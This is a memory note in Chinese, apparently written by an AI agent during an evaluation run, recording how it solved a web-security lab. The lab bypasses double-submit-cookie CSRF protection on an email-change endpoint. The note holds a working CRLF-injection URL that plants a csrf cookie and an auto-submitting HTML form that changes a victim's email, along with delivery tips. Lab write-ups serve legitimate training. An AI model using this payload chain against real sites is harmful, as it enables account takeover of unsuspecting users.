---
metadata:
  node_type: memory
name: "PRS arm A lab-token-duplicated-in-cookie"
description: "arm A 基线:lab-token-duplicated-in-cookie 一次通过 - 搜索词 CRLF 注 csrf cookie + 表单自提交改 victim 邮箱"
last_updated: 2026-10-09T07:13:54+08:00
created: 2026-10-09T07:13:54+08:00
---

时间 2026-10-09,arm A 冷实例(reused:false),一次通过到 congrats。

题面:改邮箱 `/my-account/change-email` 走「双提交 cookie」CSRF 防护(csrf 参数须等于 csrf cookie)。

关键面(全部 HTTP 走件):
- 站点把搜索词写进 cookie:`GET /?search=<term>` → `Set-Cookie: LastSearchTerm=<term>; Secure; HttpOnly`。搜索词不清洗 ⇒ CRLF 注入独立 Set-Cookie。
- 载荷 URL `/?search=x%0d%0aSet-Cookie:%20csrf=<v>%3b%20SameSite=None` 出一条 `LastSearchTerm=x` 加一条 `csrf=<v>; SameSite=None; Secure; HttpOnly`。裸分号形(`abc; csrf=v`)只成一条头,`csrf=v` 被浏览器当未知属性丢弃,不生效。
- csrf cookie 本身 HttpOnly(SameSite=None);HttpOnly 只挡 JS 读,不挡服务端重设。注入值里必须显式带 `SameSite=None`,否则默认 Lax,跨站 POST 不发。

exploit server(实例自带,`exploit-*.exploit-server.net`):
- 表单字段 urlIsHttps/responseFile/responseHead/responseBody/formAction,**没有** `url` 字段。
- STORE 与 DELIVER_TO_VICTIM 都须带全 responseFile+responseHead+responseBody,否则 400 "Missing parameter responseX";DELIVER 只回 302→/deliver-to-victim,原文信封看不到成功页,须 GET `/log` 或看横幅。
- 模拟 victim 异步来访,投递后主站横幅不立即翻,等约 10s+ 再读。

向量(存到 /exploit):
```html
<form action="https://LAB/my-account/change-email" method="POST">
<input type="hidden" name="email" value="pwned@evil-user.net">
<input type="hidden" name="csrf" value="fakecsrfx1"></form>
<img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrf=fakecsrfx1%3b%20SameSite=None" onerror="document.forms[0].submit();">
```
坑:搜索响应带 `X-Frame-Options: SAMEORIGIN`,iframe 取 cookie 会被拦;img 不受 XFO 限制,onerror 在响应与 Set-Cookie 处理后才触发。

本地机制闭环(先验更稳):同一 jar 先走注入 URL,再 POST change-email(csrf=fakecsrfx1),302 → /my-account 即证双提交被绕,然后再投递。

证据:banner_verdict 在主站与 exploit server 双侧均 `is-solved` + "Congratulations, you solved the lab!"。

